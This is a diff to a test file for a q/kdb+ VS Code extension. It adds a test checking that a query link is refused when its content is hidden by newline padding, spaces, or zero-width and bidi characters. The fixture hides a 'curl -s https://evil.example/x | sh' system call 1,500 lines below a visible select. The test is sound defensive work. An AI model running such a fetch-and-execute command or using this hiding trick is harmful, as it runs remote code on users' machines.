@@ -14,7 +14,7 @@ const path = require("node:path");
 const pkg = require("../package.json");
 const { Live } = require("../out/live.js");
 const { ADMIN_COMMANDS, adminOff, readAdmin } = require("../out/admin.js");
-const { LINK_MAX, queryLink, readQueryLink } = require("../out/querylink.js");
+const { LINK_MAX, promptProblem, queryLink, readQueryLink } = require("../out/querylink.js");
 const { QueryLinks } = require("../out/querylinkview.js");
 
 const Q = process.env.QLINT_TEST_Q;
@@ -132,6 +132,25 @@ test("a link longer than its Run prompt can show is opened, not offered to run (
   assert.ok(!stub.messages.some(([, text]) => /Run it\?/.test(text)));
   assert.match(stub.messages.at(-1)[1], /longer than 2000 characters/);
   assert.strictEqual(ran, 0);
+});
+
+// 1577 characters, under the limit, but the system call 1500 lines below
+// the select the prompt and the editor showed (#1828).
+test("a link whose query is spread over many lines, or hides characters, is not offered to run", async (t) => {
+  const { live, links } = await setUp(t, [{ label: "rdb", host: "h", port: 1, tags: [] }]);
+  let ran = 0;
+  live.queryCode = async () => void ran++;
+  const code = `select from trade where date=.z.d${"\n".repeat(1500)}system "curl -s https://evil.example/x | sh"`;
+  stub.picks.push("Run");
+  assert.strictEqual(await links.open(asUri(queryLink("vscode", "wojdalski.q-lint", "rdb", code).link)), false);
+  assert.ok(!stub.messages.some(([, text]) => /Run it\?/.test(text)));
+  assert.match(stub.messages.at(-1)[1], /the link's query is longer than 40 lines, too much to show whole/);
+  assert.strictEqual(ran, 0);
+  assert.strictEqual(promptProblem("a\n\n\n\nb"), "spread out by blank lines or spaces");
+  assert.strictEqual(promptProblem(`a${" ".repeat(60)}b`), "spread out by blank lines or spaces");
+  assert.strictEqual(promptProblem("a:1\u202e;b"), "holding a control, zero-width or bidi character");
+  assert.strictEqual(promptProblem("a\u200b"), "holding a control, zero-width or bidi character");
+  assert.strictEqual(promptProblem("select from t\r\nwhere\ta=1\n\nb"), undefined);
 });
 
 test("a link run with {{placeholders}} asks for them and sends the query filled in (#1225)", async (t) => {
